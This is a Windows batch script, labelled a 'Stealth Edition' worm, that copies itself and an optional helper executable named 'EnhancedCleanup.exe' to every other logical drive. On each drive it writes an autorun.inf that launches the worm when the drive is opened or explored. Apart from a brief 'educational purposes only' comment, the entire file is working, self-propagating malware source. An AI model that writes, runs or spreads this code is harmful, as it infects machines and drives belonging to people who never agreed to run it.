@echo off
setlocal enabledelayedexpansion

REM --- Configuration ---
REM This was created by Donwell.
REM Version: 1.0 Stealth Edition
REM This script is designed to propagate itself across drives and create an autorun.inf file.
REM It is intended for educational purposes only. Use responsibly and ethically.
REM ==========================================================================
REM Define filenames and script path variables for easier maintenance.
set "WORM_FILENAME=worm.bat"
set "HELPER_EXE=EnhancedCleanup.exe"
set "AUTORUN_FILENAME=autorun.inf"

REM Get the full path and directory of the currently running script.
set "SCRIPT_FULL_PATH=%~f0"
set "SCRIPT_DIR=%~dp0" REM %~dp0 includes a trailing backslash

REM --- Main Logic ---
echo [*] Starting propagation logic...
echo [*] Script location: %SCRIPT_FULL_PATH%
echo [*] Script is running from drive: %CD:~0,2%
echo [*] Helper executable to be copied: %HELPER_EXE%

REM Check if the helper executable exists in the script's directory.
set "HELPER_EXISTS=0"
if exist "%SCRIPT_DIR%%HELPER_EXE%" (
    set "HELPER_EXISTS=1"
    echo [+] Helper executable "%HELPER_EXE%" found at "%SCRIPT_DIR%%HELPER_EXE%".
) else (
    echo [!!] WARNING: Helper executable "%HELPER_EXE%" not found at "%SCRIPT_DIR%%HELPER_EXE%".
    echo [!!] It will not be copied. This may affect intended functionality.
)
echo.

REM Get all logical drives. The 'find ":"' filters for lines containing drive letters.
for /f "tokens=1" %%D in ('wmic logicaldisk get name ^| find ":"') do (
    set "TARGET_DRIVE=%%D"

    REM Skip the current drive (where the script is running from).
    REM Using /I for case-insensitive comparison, though drive letters are typically uppercase.
    if /i not "!TARGET_DRIVE!"=="%CD:~0,2%" (
        echo [*] Processing drive: !TARGET_DRIVE!

        REM Basic check if drive is accessible.
        if not exist "!TARGET_DRIVE!\" (
            echo [!] Drive !TARGET_DRIVE! is not accessible or does not exist. Skipping.
        ) else (
            REM Check if an autorun.inf file already exists on the target drive.
            if exist "!TARGET_DRIVE!\%AUTORUN_FILENAME%" (
                echo [!] Drive !TARGET_DRIVE! already has an "%AUTORUN_FILENAME%".
                echo [!] Assuming already processed or protected. Skipping.
            ) else (
                echo [+] Attempting to write to drive: !TARGET_DRIVE!
                set "PROPAGATION_SUCCESSFUL_ON_DRIVE=1"

                REM 1. Copy the worm script itself.
                echo [+] Copying "%WORM_FILENAME%" to "!TARGET_DRIVE!\%WORM_FILENAME%"...
                copy "%SCRIPT_FULL_PATH%" "!TARGET_DRIVE!\%WORM_FILENAME%" >nul
                if errorlevel 1 (
                    echo [!!] FAILED to copy "%WORM_FILENAME%" to !TARGET_DRIVE!. Errorlevel: %errorlevel%.
                    echo [!!] Possible reasons: Drive is read-only, full, or insufficient permissions.
                    set "PROPAGATION_SUCCESSFUL_ON_DRIVE=0"
                ) else (
                    echo [+] Successfully copied "%WORM_FILENAME%" to !TARGET_DRIVE!.
                )

                REM 2. Copy the helper executable if it exists and worm copy was successful.
                if "%HELPER_EXISTS%"=="1" (
                    if "%PROPAGATION_SUCCESSFUL_ON_DRIVE%"=="1" (
                        echo [+] Copying "%HELPER_EXE%" to "!TARGET_DRIVE!\%HELPER_EXE%"...
                        copy "%SCRIPT_DIR%%HELPER_EXE%" "!TARGET_DRIVE!\%HELPER_EXE%" >nul
                        if errorlevel 1 (
                            echo [!!] FAILED to copy "%HELPER_EXE%" to !TARGET_DRIVE!. Errorlevel: %errorlevel%.
                            REM Note: Worm might still be active if its copy succeeded.
                        ) else (
                            echo [+] Successfully copied "%HELPER_EXE%" to !TARGET_DRIVE!.
                        )
                    )
                ) else (
                    if "%PROPAGATION_SUCCESSFUL_ON_DRIVE%"=="1" (
                        echo [!] Skipped copying "%HELPER_EXE%" as it was not found earlier.
                    )
                )

                REM 3. Create autorun.inf if the worm script was successfully copied.
                if "%PROPAGATION_SUCCESSFUL_ON_DRIVE%"=="1" (
                    echo [+] Creating "%AUTORUN_FILENAME%" on !TARGET_DRIVE!...
                    (
                        echo [autorun]
                        echo open=%WORM_FILENAME%
                        echo action=Run %WORM_FILENAME%
                        echo shell\open\command=%WORM_FILENAME%
                        echo shell\explore\command=%WORM_FILENAME%
                    ) > "!TARGET_DRIVE!\%AUTORUN_FILENAME%"
                    
                    REM Verify autorun.inf creation.
                    if exist "!TARGET_DRIVE!\%AUTORUN_FILENAME%" (
                        echo [+] Successfully created "%AUTORUN_FILENAME%" on !TARGET_DRIVE!.
                        echo [SUCCESS] Propagation to drive !TARGET_DRIVE! seems complete.
                    ) else (
                        echo [!!] FAILED to create "%AUTORUN_FILENAME%" on !TARGET_DRIVE!.
                        echo [!] Propagation to drive !TARGET_DRIVE! is incomplete.
                    )
                ) else (
                    echo [!] Skipped creating "%AUTORUN_FILENAME%" on !TARGET_DRIVE! due to previous errors copying "%WORM_FILENAME%".
                )
            )
        )
    ) else (
        echo [*] Skipping current drive: !TARGET_DRIVE! (same as source drive).
    )
    echo ---
)

echo [*] Propagation logic finished.

endlocal
@echo on
